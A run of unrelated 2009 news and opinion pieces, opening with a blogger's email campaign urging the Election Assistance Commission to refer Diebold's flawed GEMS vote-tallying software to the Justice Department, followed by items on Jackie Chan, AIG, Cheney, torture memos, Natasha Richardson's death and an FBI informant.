I am struck by the fact that Commissioner Rodriguez has failed to recognize that the use of the voting system in question , GEMS v. 1.18.19 , is a violation of HAVA and therefore this incident should be referred to the Department of Justice for investigation .
By their own admission , Diebold is negligent of sending out a voting system that is not accurate and when they realized their error they did not bother to recall and correct the error ; they sent a short , two paragraph , informal memo to their customers .
The EAC may not be able to carry out an investigation but the DoJ can and should do that .
The voting machine vendors should not be allowed to continue to put out voting systems that violate the mandates in HAVA while the EAC ignores the issue .
Below is an email I sent to all addressees on Dec. 5 . I am still awaiting an answer to my simple question ; " Will the EAC refer this violation of federal law to the Department of Justice for investigation ? "
Within a couple hours , Commission Chair Rosemary Rodriguez replied to my email with an email of her own to EAC Director Tom Wilkey , asking him to discuss the matter with their Office of General Counsel ( OGC ) , and acknowledging that the commission has , in the past , referred other matters --- on issues of " voter registration " --- to the DoJ ...

Pls consult with the OGC on this .
I know that we refer matters re voter registration because of our jurisdiction over the federal form but I know of no other referrals .
Thanks .
It appears , from the above email , that Rodriguez may have never read the commission 's own advisory from 2004 , stating the position of the commission 's very first chairman , that the " EAC should solicit information about suspicious electronic voting system activity including software programming and should request aggressive investigative and prosecutorial responses from the U.S. Department of Justice Elections Crimes Branch in the Criminal Division . "
We received no acknowledgment from Wilkey , in regard to Rodriguez ' request , nor any further response from anyone at the commission .
So , nearly a month later , on January 21 , 2009 we sent another email to EAC Spokeswoman Jeannie Layson , with a cc to the new Commission Chair Gineen Beach , Commissioner Rodriguez , Director Wilkey and Voting Systems Chief Brian Hancock , again requesting an answer to the original question sent nearly two months earlier , or , at least an explanation as to why no response would be forthcoming .
Layson punted , in response , shortly thereafter ...

Your question is under review and we will have a more complete response in the near future .
The " near future " had n't arrived over a week later , so on Friday , January 30th , we sent another email to what had become the regular list of addressees :

It has now been a full month since I originally asked my question and a week since your last response .
The question was very simple .
It required a ' Yes ' or ' No ' .
On the next Monday , Layson responded back with yet another stalling email ...

If you look to the bottom of this string of emails you will note that I brought this issue to your attention originally on Dec. 29 , 2008 .
[ ed note :
The original query was actually a month earlier , on Dec. 5th , as seen in the first email posted above . ]
Almost immediately [ following the Dec. 29th query ]
I received a response from Commissioner Rodriguez in which she requested Director Wilkey to contact the OGC on this matter .
Since that period I have asked what action is being taken and I have gotten less than satisfactory responses such as the last one I got from Ms. Layson that she was checking for a status change .
It almost seems as if the EAC is dragging this out until I give up and drop the issue .
I understand that the EAC has no investigative ability with regards to violations of HAVA .
The Dept. of Justice has that ability , however .
Surely when faced with the evidence that a violation of the Help America Vote Act has taken place it must be the responsibility of the EAC to refer that violation to the DoJ for investigation .
In this case , as I have stated over and over , Diebold admitted in emails to their customers that their GEMS 1.18.19 may not always record all votes accurately .
That should be enough right there to raise a flag at the EAC .
However , it has now gone further with the use of that system by an unsuspecting California county which then experienced a loss of votes .
So , once more , will the EAC do the right thing and ask the DoJ to investigate a violation of HAVA Sec. 301( a ) ( 5 ) .
I will not forget about this issue .
I will not just give up and go away .
I received the following response from Layson two days later ...

We 're waiting on information from the CA Secretary of State 's office and from Humboldt County , which we plan to post in the voting system reports clearinghouse .
Then we will send out a notification to all stakeholders ( including DOJ ) about the information we 've received and a link to the info .
After two and a half months , the EAC was saying in the above response , that , essentially they are going to do nothing but post links to any reports from California on their " Voting System Reports Clearinghouse " page at the EAC website ( the " Clearinghouse " page is quite difficult to find , as its buried some four levels deep on the main menu via the EAC 's front page ) and then , likely , include the fact that they have done so , in their weekly newsletter .
There would be no request for investigation , as per their original Chairman set out in 2004 , and as echoed in an advisory publication at the time .
So , we took the opportunity to remind Layson , again , of the Commission 's own 2004 Advisory statement , and notified them that we were not seeking " on the record comment " for possible publication in this matter ...

On July 13 , 2004 the commission issued " Commission Advisory Letter 2004 - 1 " .
This letter was issued " to insure election integrity and promote voter confidence " .
In this letter the commission advised " EAC
should solicit information about suspicious electronic voting system activity including software programming and should request aggressive investigative and prosecutorial responses from the U. S. Department of
Justice Elections Crimes Branch in the Criminal Division . "
We note that this advisory was written , and published , before the ex-NASED [ National Association of State Election Directors ] voting systems panel members , Tom Wilkey and Donneta Davidson , moved over to the EAC and joined Brian Hancock .
All three were involved in the NASED voting system authorization process .
[ ed note :
That 's the process which first " tested " and then " qualified " the flawed Diebold / Premiere system in question for use by states around the country . ]
I have tried since late December to get a ' Yes ' or ' No ' response with regards to a voting system that failed to accurately count votes , a violation of HAVA Section 301( a ) ( 5 ) .
I have also provided a letter from
the vendor , Premier , that proves they knew the voting system was not always accurate .
In view of the fact that the EAC had previously announced a willingness to " request aggressive investigative and prosecutorial responses from the U.S. Department of Justice Elections Crimes Branch in the Criminal
Division " and in view of the fact that there is clear evidence of a violation of the Help America Vote Act of 2002 why has the EAC ignored my request for an answer as to whether the Commission would take action ?
I will be writing an article on the seeming unwillingness of the commission to take any action on a violation of the federal law that is that commission 's whole reason for being , while obfuscating and ignoring
a simple request for information from a citizen .
As has become expected , the response last week was , yet again , non-committal and generally non-responsive to the question ...

To refresh your memory your prior email said , " We 're waiting on information from the CA Secretary of State 's office and from Humboldt County , which we plan to post in the voting system reports clearinghouse .
Then we will send out a notification to all stakeholders ( including DOJ ) about the information we 've received and a link to the info . "
When I have gotten a response , this was the same type of non-responsive answer I have gotten from the EAC on this issue since Dec. 5 .
According to your prior email , the EAC has already made a determination to post it in the " clearinghouse " and inform the world , probably in the weekly EAC newsletter , that the information is there .
No request for investigation .
If you had simply said , " We do n't feel any investigation of Diebold is warranted " you would have answered my question and you could have done that months ago .
What is there that is being hidden ?
Why does the EAC NOT want to request an investigation of Diebold for a violation of HAVA ?
Why does the present EAC seem to want to ignore the advice of the previous EAC leadership ?
Those are the questions I will be asking in an article to be posted sometime early next week .

No determination has been made beyond that , so I can't give you a yes or no answer .
At this point , it seems obvious that someone would be making a determination concerning referral ( or not ) to the DoJ .
Recall , in the January 22nd response from Layson , she informed that the original " question is under review " .
But who would be doing that " review " and when would the determination finally be made ?...

Who is making that determination and when can we expect a determination such that I get an answer to my original question of Dec. 5 , 2008 , " Will the EAC refer this violation of federal law to the Department of Justice for investigation ? "

And so it goes .
Around and around again ...
The EAC , via their spokeswoman , has been stalling for months , saying that " someone " was going to decide what action to take , at some point , but after three months , the mouth piece for the organization apparently has no idea about the status of anything , despite inquiry after inquiry .
So who is being protected by the EAC here ?
As stated in the email of 18 February , three members of the EAC , including one Commissioner ( Donnetta Davidson ) ; the EAC's Executive Director ( Tom Wilkey ) ; and their Voting Systems Certification Director ( Brian Hancock ) ; were all involved in the National Association of State Election Directors ( NASED ) process of authorizing voting systems for use at the federal level .
That was the system that allowed the use of nearly every electronic voting system presently in use by states , including all of those that have failed in myriad elections in the past .
The list of e-voting systems approved for use by NASED --- which oversaw federal testing and approval of voting systems until only recently , as per the EAC 's directive at their founding --- includes the failed Diebold GEMS v1.18.19 .
Is it the voters or the vendors who are being protected by the EAC ?
If Diebold had been a drug company or auto maker they would have been told by the FDA or NTSB to remove their product from the market and fix the problem or , in the case of a problem with an automobile , recall the cars and make immediate repairs for customers free of charge .
But the EAC does not see themselves as a " servant of the People " , so , it seems , they continue to ignore problems , and put off those inquirying as to how --- and if --- they are doing their jobs , in hopes that the problem , and the People asking about it , will simply go away .
Perhaps it 's time to replace the Executive Director and Commissioners with people who have the best interest of the People in mind .
And certainly , it is time for someone to step up and ask the Department of Justice to investigate Diebold for knowingly allowing the use of a voting system that they knew was not accurate .
* * *
In the meantime , CA's Sec. of State Debra Bowen may be doing at least some of the EAC 's work for them .
She will be holding a Public Hearing [ PDF ] on Tuesday , March 17th in Sacramento , " to give people an opportunity to express their views regarding the investigation into " into the " anomaly " discovered in the Diebold / Premier GEMS v 1.18.19 voting system , by the citizens of Humboldt County .
The Times - Standard reported on Sunday that Bowen is likely to decertify the system in the state , as currently used by Humboldt , as well as a number of other counties .
" The public hearing is typically the last step in the [ decertification ] process , " according to a CA SoS spokesperson .
The software designer of the citizen project which discovered the problem in Humboldt , Mitch Trachtenberg , also believes that the DoJ should investigate the matter .
" I think that would be totally appropriate , " Trachtenberg told the Times - Standard .
" They sold software that does n't work . "
The same Diebold system , " that does n't work " --- as well as later versions , also believed to have the same programming bug , and also federally approved for states ' use under the EAC / NASED program --- is used widely across the country , a full four years since Diebold admitted to the problem .
No democracy , please , we 're Chinese !
Hong Kong kung fu supremo Jackie Chan is famous worldwide for beating up the bad guys , but the action star is unlikely to use his martial arts skills to fight for democracy .
Chan launched a broadside against calls for more freedom in China this weekend , saying he was n't sure if a free society was what the country needed and that Chinese people needed to be controlled .
His remarks have proven unpopular in his native city - state .
" I 'm not sure if it 's good to have freedom or not .
I 'm really confused now .
If you 're too free , you 're like the way Hong Kong is now .
It 's very chaotic .
Taiwan is also chaotic , " Chan , 55 , told the Boao Forum for Asia – a regional conference modelled on the World Economic Forum in Davos – when pressed by fellow panel members to take a stance against rigorous control of the media on the mainland and to give his views on suffocating censorship in the growing Chinese film market .

" I 'm gradually beginning to feel that we Chinese need to be controlled .
If we 're not being controlled , we 'll just do what we want , " he said .
His comments were warmly received by the audience , composed mostly of Chinese business leaders , but Hong Kong pro-democracy legislators were incensed .
" He 's insulted the Chinese people .
Chinese people are n't pets , " pro-democracy legislator Leung Kwok - hung told the Associated Press .
" Chinese society needs a democratic system to protect human rights and the rule of law , " he said .
Veteran Hong Kong pro-democracy legislator Albert Ho said Chan 's remarks were " racist " .
" People around the world are running their own countries .
Why ca n't Chinese do the same ? "
Like many Hong Kongers with major business interests in mainland China , Chan has taken a steadfastly pro-Beijing line since the former British colony reverted to Chinese control in 1997 .
Under the territory 's mini-constitution , the Basic Law , Hong Kong enjoys considerably more freedom than the mainland .
In democratic Taiwan , MP Huang Wei-che said Chan " has enjoyed freedom and democracy and has reaped the economic benefits of capitalism .
But he has yet to grasp the true meaning of freedom and democracy " .
Chan was critical of the crackdown on pro-democracy demonstrators in Beijing and other Chinese cities in June 1989 , but in recent years has taken a much more pro-Beijing line .
He was heavily involved in the public relations drive ahead of the Olympics and features as a Chinese customs officer in a promotional video aimed at stopping tourists buying pirated goods when visiting China .
The real outrage in the AIG fiasco is n’t the struggling insurance giant ‘s $ 165 million in bonus payments , said Larry Kudlow in National Review .
It ’s the way the Bush and Obama administration ’s bungled the whole AIG bailout .
This disgraceful episode “ shows , once again , why the government should n't run anything , because it cannot run anything . "
Obama 's team has " made a complete shambles of the AIG bailout , " no doubt , said Tim Rutten in the Los Angeles Times .
But the real outrage here is that the contracts guaranteeing bonuses to a bunch of " cowboy securities traders living in Connecticut " are being talked about like they 're sacred , while the " employment contracts involving hardworking men and women on Detroit 's assembly lines are somehow less legally binding , " and an impediment to economic progress .
The bonuses are obscuring the real scandal at AIG , said former New York governor Eliot Spitzer in Slate .
The real disgrace is " AIG 's counterparties getting paid back in full , to the tune of tens of billions of taxpayer dollars . "
This just allows shameless double - dipping by the same group of big banks —
Goldman Sachs , Bank of America , Merrill Lynch , UBS , JPMorgan Chase , Morgan Stanley , Deutsche Bank , Barclays — that already received TARP money .
An American academic has devised an algorithm capable of solving any Sudoku puzzle , no matter how fiendishly difficult , and it is available on the website of the American Mathematical Society .
Computer science professor emeritus James F. Crook , formerly of Winthrop University in South Carolina , writes that the obsessive pastime is " a trivial puzzle . "
Ram Murty , a Queen 's University mathematics professor who has read the paper – " Pencil - and - Paper Algorithm for Solving Sudoku puzzles " – said Crook has " codified what the average mind does when it looks at a Sudoku problem . "
Murty and fellow Queen 's professor Agnes Herzberg have also published research about Sudoku for the society and are cited in Crook 's paper , which describes his own algorithm as a " tree - based search algorithm based on backtracking in a tree until a solution is found . "
Murty explains : " So he actually said , ` First , do this .
Then , do this .
After having done this , go and check for this .
If this happens , go back to step one .
If it does n't happen , go to the next step . '
I mean , it is like a computer flow chart . "
" Most people do this by trial and error , including myself , " Murty said .
" What Crook has done ... is more or less systematized what the average mind does and made it into some sort of computer algorithm – which is a step - by - step procedure . "
Crook 's algorithm is labour - intensive and would be a lengthier , more laborious process than the average Sudoku addict 's efforts .
Herzberg , a statistician , seemed unimpressed with the prospect of a guaranteed , formulaic victory .
" It spoils the game , " she said .
" It 's like playing chess on the computer . "
Herzberg and Murty 's 2007 paper , " Sudoku Squares and Chromatic Polynomials , " applies an arcane branch of mathematics called graph colouring to Sudoku .
They laid down for the first time the conditions necessary for the puzzle to have just one solution .
Of Crook Murty said , " I do n't think he 's spoiling the fun .
From a computer science point of view he 's done an important service . "

Ludicrous ?
Possibly .
Grist for anyone who thinks that dog - owners have taken yoga too far ?
Perhaps .
But nationwide , classes of doga  yoga with dogs , as it is called  are increasing in number and popularity .
Since Ms. Caliendo , a certified yoga instructor in Chicago , began to teach doga less than one year ago , her classes have doubled in size .
Not everyone in the yoga community is comfortable with this .
“ Doga runs the risk of trivializing yoga by turning a 2,500 - year - old practice into a fad , ” said Julie Lawrence , 60 , a yoga instructor and studio owner in Portland , Ore .
“ To live in harmony with all beings , including dogs , is a truly yogic principle .
But yoga class may not be the most appropriate way to express this . ”

CBS , home to “ 60 Minutes , ” the “ CSI ” franchise , “ Two and a Half Men ” and the new hit crime drama “ The Mentalist , ” is having a better year in prime time than any other network .
And yet , as at the other networks , profits have declined sharply at CBS .
For decades , the big three , now big four , networks all had the same game plan : spend many millions to develop and produce scripted shows aimed at a mass audience and national advertisers , with a shelf life of years or decades as reruns in syndication .
But that model , based on attracting enough ad dollars to cover the costs of shows like “ Lost ” and “ ER , ” no longer appears viable .
Network dramas now cost about $ 3 million an hour .
The future for the networks , it seems , is more low - cost reality shows , more news and talk , and a greater effort to find new revenue streams , whether they be from receiving subscriber fees as cable channels do , or becoming cable networks themselves , an idea that has gained currency .
Dick Cheney said President Obama ’s handshake with Venezuelan President Hugo Chavez was n't a good idea .
Cheney hits Obama on handshake
Former Vice President Dick Cheney told Fox News Channel ’s Sean Hannity that President Obama ’s handshake with Venezuelan President Hugo Chavez “ was not helpful ” and could lead “ foes ” of the U.S. to “ think they 're dealing with a weak president . ”
The interview will be aired in two parts , at 9 p.m. ET Monday and Tuesday night .

“ I find disturbing is the extent to which he has gone to Europe , for example , and seemed to apologize profusely in Europe , and then to Mexico , and apologize there , and so forth , ” Cheney told Hannity .
“ And I think you have to be very careful .
The world outside there , both our friends and our foes , will be quick to take advantage of a situation if they think they 're dealing with a weak president or one who is not going to stand up and aggressively defend America 's interests . ”
Cheney also said he found the administration ’s release of memos about CIA interrogation techniques “ a little bit disturbing ” since the government has not also release documents he claims would show “ the success of the effort . ”
Cheney said he has “ formally asked ” for the declassification of documents he says would “ lay out what we learned through the interrogation process and what the consequences were for the country . ”
Here are excerpts released by Fox News Channel ’s “ Hannity ” :
On his thoughts regarding the CIA memos that were recently declassified and his request to the CIA to declassify additional memos that confirm the success of the Bush administration ’s interrogation tactics :
“ One of the things that I find a little bit disturbing about this recent disclosure is they put out the legal memos , the memos that the CIA got from the Office of Legal Counsel , but they did n't put out the memos that showed the success of the effort .
And there are reports that show specifically what we gained as a result of this activity .
They have not been declassified . ”
“ I formally asked that they be declassified now .
I have n't announced this up until now , I have n't talked about it , but I know specifically of reports that I read , that I saw that lay out what we learned through the interrogation process and what the consequences were for the country . ”
“ And I 've now formally asked the CIA to take steps to declassify those memos so we can lay them out there and the American people have a chance to see what we obtained and what we learned and how good the intelligence was , as well as to see this debate over the legal opinions .
On if the handshake between President Obama and Hugo Chavez was a bad image for the United States : “ Well , I think it 's not helpful .
I think it 's important . ”
“ You have millions of people all across South America who are watching how we respond .
And if they see an American president sort of cozying up to somebody like Daniel Ortega or Chavez , I think it 's not helpful .
I think it sort of sets the wrong standard . ”
On what he thought of the handshake : “ Well , I did n't think much of it .
I mean , I 've seen Hugo Chavez in operation before , and Daniel Ortega down in Nicaragua .
These are people who operate in our hemisphere , but who do n't believe in and are n't supportive of basic fundamental principles and policies that most of us in this hemisphere adhere to . ”
“ Basically , the position we took in the Bush administration was to ignore it .
I think that was the right thing to do . ”
On how he believes the United States is being represented overseas : “ Well , I guess I ’ve been concerned the way that we ’ve been represented overseas . ”
“ There is a great temptation for a new administration to come in and when you find a problem , obviously , to blame it on your predecessor .
We did it .
I 'm sure the Obama administration is not the first one ever to do that . ”
“ But what I find disturbing is the extent to which he has gone to Europe , for example , and seemed to apologize profusely in Europe , and then to Mexico , and apologize there , and so forth . ”
“ And I think you have to be very careful .
The world outside there , both our friends and our foes , will be quick to take advantage of a situation if they think they 're dealing with a weak president or one who is not going to stand up and aggressively defend America 's interests . ”
“ The United States provides most of the leadership in the world .
We have for a long time .
And I do n't think we 've got much to apologize for .
You can have a debate about that .
But the bottom line is that , you know , when you go to Europe and deal with our European friends and allies , some things they do very well , some things they do n't . ”
“ Sometimes it 's important that a president speak directly and forthrightly to our European friends .
And you do n't get there if you 're so busy apologizing for past U.S. behavior . ”

British actress Natasha Richardson has died from head injuries sustained in a skiing accident in Canada .
Richardson , 45 , the daughter of actress Vanessa Redgrave , fell on a beginners ' slope at the Mont Tremblant resort in Quebec on Monday .
The family were devastated by the death of their " beloved Natasha " , her husband Liam Neeson 's publicist said .
Richardson died in a New York hospital , close to the home she shared with Irish actor Neeson and their two sons .
The accident happened while the actress was taking a supervised skiing lesson at the Quebec resort .
She was one of the few modern actresses who was as smart as she was pretty
Film director Ken Russell Richardson initially showed no sign of injury but about an hour later she was taken to a nearby hospital after feeling unwell .
It was later confirmed her injuries were critical .
Irish actor Neeson , 56 , flew from the set of his new film in Toronto to be with his wife as soon as he heard news of the accident .
He accompanied her as she was flown from Canada to Lenox Hill Hospital , in New York , on Tuesday .
Neeson , her mother Oscar - winning actress Vanessa Redgrave , 72 , and two sons , Michael , 13 , and Daniel , 12 , had gathered at her bedside .
Richardson and Neeson married in 1994
Her sister , the Nip / Tuck actress Joely Richardson , was also pictured visiting the hospital .
Richardson 's death was announced shortly before midnight GMT .
Neeson left the Manhattan hospital in a people carrier at about 2030 local time ( 0030 GMT ) .
Alan Nierob , Neeson 's publicist , said : " Liam Neeson , his sons , and the entire family are shocked and devastated by the tragic death of their beloved Natasha .
" They are profoundly grateful for the support , love and prayers of everyone , and ask for privacy during this very difficult time . "
Richardson starred in films and TV but won most acclaim for her stage work .
Part of the Redgrave acting dynasty , she was the daughter of Redgrave and director Tony Richardson .
' Great actress ' Film - maker Ken Russell , who directed Richardson in her debut movie Gothic , said she was " always poised , prepared , focused and very , very bright " .
Writing in The Times , the 81 - year - old added : " She was one of the few modern actresses who was as smart as she was pretty , and as gentle as she was fierce . "
Oscar - winning film director Sam Mendes said Richardson was " one of a kind , a magnificent actress . "
Mendes , who directed Richardson in the stage production of Cabaret , added : " It defies belief that this gifted , brave , tenacious , wonderful woman is gone . "
HAVE YOUR SAY
She just personified the class that seems to be lacking today in Hollywood Kathy , Toronto , Canada The Sunday Telegraph 's theatre critic , Tim Walker , said she never needed to ride on the coat - tails of her famous relations .
He said Richardson took the decision early in her career to " stand or fall on her own " and left London to begin her career in Leeds at the West Yorkshire Playhouse .
" The world of acting has been deprived of a great actress , really in her prime , " he said .
" She had a sort of luminous presence on the stage , but off - stage she was a very shy , easy - going , almost self - deprecating character who did n't like being made a fuss of . "
Richardson , whose father director Tony died of Aids- related causes in 1991 , was on the board of the US - based charity amfAR , The Foundation for Aids Research .
A spokeswoman for the charity said she was a " dedicated Aids advocate " and an " eloquent spokesperson for amfAR " .
" Our hearts go out to her family .
This is a catastrophic loss for them , and it is a terrible loss for amfAR and the fight against Aids , " she said .
" She generously contributed her time and resources to amfAR for over 15 years . "
Head injuries
It is not known exactly what happened to Richardson .
However , leading neurosurgeon Chris Chandler said a seemingly minor blow on the head can cause life - threatening injuries .
Mr Chandler , from King 's College Hospital in south London , said the effects of a blow to the head may not become apparent until several hours afterwards and , if untreated , a patient can fall into a coma .
" A blow to the head can cause a bruise or rupture a blood vessel that slowly swells , causing pressure to build up inside the skull , " he said .
" In the skull there is nowhere for the brain to move to so pressure continues to grow and that swelling can cause the brain to malfunction because it can limit circulation .
" If that pressure is not relieved it can kill . "

The ASTRA project , standing for Ancient instruments Sound / Timbre Reconstruction Application , has revived an instrument that has n’t been played or heard in centuries .
Using the Enabling Grids for E - sciencE infrastructure for computing power , a team based in Salerno and Catania , Italy , has reconstructed the “ epigonion , ” a harp - like , stringed instrument used in ancient Greece .
With data from numerous sources , including pictures on urns , fragments from excavations and written descriptions , the team has been able to model what the instrument would have looked and sounded like .
Their model has become sophisticated enough to be used by musicians of the Conservatories of Music of Salerno and Parma in concerts .
The idea and mathematical concepts behind this work is several decades old , the first attempts being made in 1971 .
Now with grid technology these researchers have the required computing power to recreate an ancient instrument that would previously have been too expensive and too difficult to manufacture by hand .
Using grid computing also means that the data used and discovered during the research is easily available to other researchers , such as archaeologists and historians .
“ The combination of the EGEE grid computing infrastructures and the high speed GÉANT2 and EUMEDCONNECT networks provided not only the immense computing power needed by ASTRA , it also allowed researchers , historians , physicists , engineers , archaeologists to bring their knowledge and their experiences together , ” added Domenico Vicinanza , Technical co-ordinator of ASTRA project and DANTE Network Engineer .
“ The benefits of the collaborative approach used in this project are far reaching .
ASTRA and EGEE not only make it possible to recreate instruments not existing anymore , they also allow any model and its associated data to be accessed by the whole scientific and education community worldwide . ”
The ASTRA project will be demonstrating the epigonion at this week ’s EGEE User Forum , 2 - 6 March 2009 , Catania , Italy .
People will be able to listen to the reconstructed instrument and play it using a MIDI keyboard .
The demonstration will also allow visitors to run real reconstruction on the grid .
A professional musician will play ancient scores on the epigonion .

Senior members of the Bush administration who approved the use of waterboarding and other harsh interrogation measures could face prosecution , President Obama disclosed today .
He said the use of torture reflected America " losing our moral bearings " .
He said his attorney general , Eric Holder , was conducting an investigation and the decision rested with him .
Obama last week ruled out prosecution of CIA agents who carried out the interrogation of suspected al - Qaida members at Guantánamo and secret prisons around the world .
But for the first time today he opened up the possibility that those in the administration who gave the go - ahead for the use of waterboarding could be prosecuted .
The revelation will enrage senior Bush administration figures such as the former vice - president Dick Cheney .
The Obama administration views the use of waterboarding as torture , while Cheney claims it is not .
Obama , taking questions from the press during a visit by King Abdullah of Jordan , reiterated he did not believe in prosecution of those CIA agents who carried out the interrogations within the guidelines set down for them .
But " with respect to those who formulated '' the policies , " that is going to be more of a decision for the attorney general within the parameters of various laws " .
He added : " I do n't want to prejudge that . "
He also opened the way for a Congressional inquiry into the issue .
Meanwhile the former US vice - president Dick Cheney has called for the disclosure of CIA memos which reveal the " success " of torture techniques , including waterboarding , used on al - Qaida suspects under the Bush administration .
Cheney said that , according to secret documents he has seen , the interrogation techniques , which the Obama administration now accepts amounted to torture , delivered " good " intelligence .
He hinted that it had significant consequences for US security .
Cheney was speaking out in response to the release by Barack Obama of four Bush administration memos detailing the agency 's interrogation methods used against al - Qaida suspects .
" One of the things that I find a little bit disturbing about this recent disclosure is they put out the legal memos , the memos that the CIA got from the Office of Legal Counsel , but they did n't put out the memos that showed the success of the effort , " Cheney said in an appearance on Fox News .
" I have n't talked about it , but I know specifically of reports that I read , that I saw , that lay out what we learned through the interrogation process and what the consequences were for the country .
" I 've now formally asked the CIA to take steps to declassify those memos so the American people have a chance to see what we obtained and what we learned and how good the intelligence was . "
Obama yesterday visited CIA headquarters to defend the publication of the internal documents .
The row gathered further momentum yesterday when it emerged that one detainee , Khalid Sheikh Mohammed , had been subjected to waterboarding 183 times and another , Abu Zubaydah , 83 times .
Obama is keen to try to put the row behind him , reluctant to see prosecutions that could be politically divisive and distract attention from his heavy domestic and foreign agenda .
In a speech to about 1,000 staff aimed at restoring CIA morale , Obama , who promised last week that CIA operatives would not be prosecuted , reiterated that he would stand by them .
" Do n't be discouraged by what 's happened in the last few weeks , " Obama said .
" Do n't be discouraged that we have to acknowledge potentially we 've made some mistakes .
That 's how we learn . "
At a private meeting with 50 rank - and - file CIA members at their headquarters in Langley , Virginia , before his speech , Obama heard " understandable anxiety and concern " from agents fearful of prosecution .
The CIA 's director during the Bush administration , Michael Hayden , who criticised the release of the memos , warned on Sunday that agents could be vulnerable because of the memos , facing civil lawsuits or congressional inquiries .
Sensitive details were blacked out in the memos seen by most of the media on Thursday but over the weekend Marcy Wheeler , of the Emptywheel blog , found a copy in which crucial details were not masked .
That copy showed that Mohammed had been subjected to waterboarding – which simulates drowning – 183 times in March 2003 .
He had been arrested in Pakistan at the start of that month .
Abu Zubaydah , a Saudi captured in Pakistan in March 2002 , was subjected to waterboarding 83 times in August 2002 .
Mohammed had admitted to involvement in terrorist actions before his capture but , after being interrogated , confessed to a list of incidents and plots that included the 1993 attack on the World Trade Centre in New York , as well as a plot to attack Heathrow , Big Ben and Canary Wharf , the beheading of the US journalist Daniel Pearl , and the Bali bombing .
Abu Zubaydah denied involvement with al - Qaida .
Obama , defending himself against those in the CIA who argued that he should not have released the memos , said legally he had no grounds for blocking a freedom of information request from the US human rights group , the American Civil Liberties Union .
" I acted primarily because of the exceptional circumstances that surrounded these memos , particularly the fact that so much of the information was public , " Obama said .
Standing in front of a wall with 89 stars , each depicting an officer killed in action , Obama praised the CIA as the " tip of the spear " in protecting the US from its enemies .
Obama said he understood that intelligence officials must sometimes feel that they are working with one hand tied behind their backs .
But , rebutting Hayden , he said : " What makes the United States special and what makes you special is precisely the fact that we are willing to uphold our values and our ideals even when it 's hard , not just when it 's easy , even when we are afraid and under threat , not just when its expedient to do so .
" So yes , you 've got a harder job and so do I , and that 's OK .
And over the long term , that is why I believe we will defeat our enemies , because we 're on the better side of history . "
Hayden had argued that the harsher interrogation techniques had provided valuable information and said that the techniques did not amount to torture .
Human rights lawyers question the credibility of the confessions because they were obtained under duress .
The White House press secretary Robert Gibbs , when asked yesterday why Bush administration lawyers could not be prosecuted , said : " The president is focusing on looking forward . "

Bruce Springsteen visits The Daily Show
Jon Stewart is a huge Springsteen fan , so naturally he treated Bruce a little better than how he treated Jim Cramer .
Bruce also performed a solid acoustic version of “ Working on a Dream . ”
In a federal courtroom in Minneapolis this month , the public transformation of Brandon Darby will become complete .
In the span of four years , he has gone from firebrand , never - trust - the - government activist in New Orleans to the confidential informant who helped the FBI arrest two Texas men on suspicion of building firebombs during the Republican National Convention in St. Paul last September .
“ I feel like , as an activist , I played a direct role in stopping violence , ” Darby , 32 , said in his first interview on his role in the investigation .
Darby was the government ’s chief informant in the investigation into David Guy McKay and Bradley Neal Crowder .
The two Austin men are scheduled to go on trial in U.S. District Court on Jan. 26 for allegedly building Molotov cocktails during the convention .
They are being held without bail .
Prosecutors claim the two men built the firebombs because they were angry that police had seized a trailer filled with riot shields they ’d built and hauled to Minnesota .
In a conversation recorded by the FBI , McKay allegedly told Darby he planned to use the explosives on law - enforcement cars parked in a lot near the Xcel Energy Center .
“ What if there ’s a cop sleeping in the car ? ” Darby asked McKay , according to an affidavit by Christopher Langert , a special agent in the FBI ’s Minneapolis office .
“ He ’ll wake up , ” McKay allegedly replied .
McKay also is accused of telling Darby , “ it ’s worth it if an officer gets burned or maimed , ” the affidavit said .
ACT OF CONSCIENCE
Darby had been working as an informant since November 2007 , and in an e-mail sent to friends Monday , he conceded he was comfortable with that .
“ Like many of you , I do my best to act in good conscience and to do what I believe to be most helpful to the world , ” he wrote .
“ Though my views on how to give of myself have changed substantially over the years , ultimately the motivations behind my choices remain the same . ”
Darby ’s admission shocked Austin ’s activist community , which includes people who have known Darby for years and worked with him on a variety of grass - roots organizing efforts .
“ Everyone that knew Brandon has gone through a whole range of emotions .
Clearly , he ’s betrayed the trust of the community , and all the communities he ’s worked with , ” said Lisa Fithian , a social - justice activist who worked with Darby in Austin .
A spokesman for Frank Magill , the U.S. attorney for Minnesota , whose office is prosecuting the case , declined to comment .
E.K. Wilson , an FBI special agent and spokesman for the bureau ’s Minneapolis office , did not immediately return a call for comment , but in the past has said the agency does not publicly discuss the work of informants .
McKay , Crowder and nine other people riding in a van with Darby had little reason to suspect he was a government informant , and Darby long had been known as having a strong mistrust of authority , particularly police .
“ He and I faced the cops with arms , ‘ law enforcement ’ ( and some within our communities ) view him as very antagonistic toward the cops and all their flavors , ” friend Scott Crow wrote of Darby on an online independent news site in November .
“ He often tried to inflame situations , ” Crow said in an interview .
“ He also spoke with a rhetoric that was pretty inflammatory , which could seem inciting to people .
It was always put off as ‘ revolutionary fervor . ’ ”
HELPING NEW ORLEANS
Darby was raised in Houston , had a little schooling after high school , became an emergency medical technician and had plans to work abroad helping civilian victims in war - torn areas .
But it was in New Orleans after Hurricane Katrina that Darby made a name for himself as an activist , organizer and , as he calls it , proponent of “ service - oriented direct action . ”
After Katrina hit the Gulf Coast in August 2005 , Darby , Crow and others started the Common Ground Collective , which describes itself as a “ decentralized network of nonprofit organizations offering support to the residents of New Orleans . ”
Common Ground began by delivering food , water and other supplies to people in the flood - ravaged city , and also set up an emergency clinic .
Since then , it has attracted more than 22,000 volunteers and has expanded to provide various types of assistance to residents .
Darby said he saw firsthand what happens when government fails to protect its citizens .
“ When I showed up in New Orleans , I was very angry at my government , ” he said .
“ I felt that rather than just protest what happened in New Orleans in your own city , it was important to protest by going to New Orleans and doing something about it . ”
But Darby said that while working on the Gulf Coast , he concluded that some activist organizations seemed more intent on promoting radical agendas than actually helping people .
“ Common Ground had over 22,000 volunteers , and the vast majority of those were average working - class Americans who just wanted to help , ” he said .
“ But what happens is , different political groups or people with ideologies show up and their focus is on their agenda . …
There was a lot of that going on . ”
‘ I SAID NO ’
After working in New Orleans , Darby returned to Texas .
He declined to speak in detail about when and how he became involved with the FBI , but court documents reveal he began working as an informant for an agent in the FBI ’s San Antonio office in November 2007 .
As for why he got involved with the FBI , Darby said it was because he discovered that people he knew were planning violence .
“ Some of them had really bad intentions , ” he said , adding that at first , he did n’t consider becoming an informant .
“ I did n’t want to go to the Bureau about it , ” he said .
“ But somebody had asked me to do something that would ’ve resulted in hurting people , and I said no .
So they started asking other people .
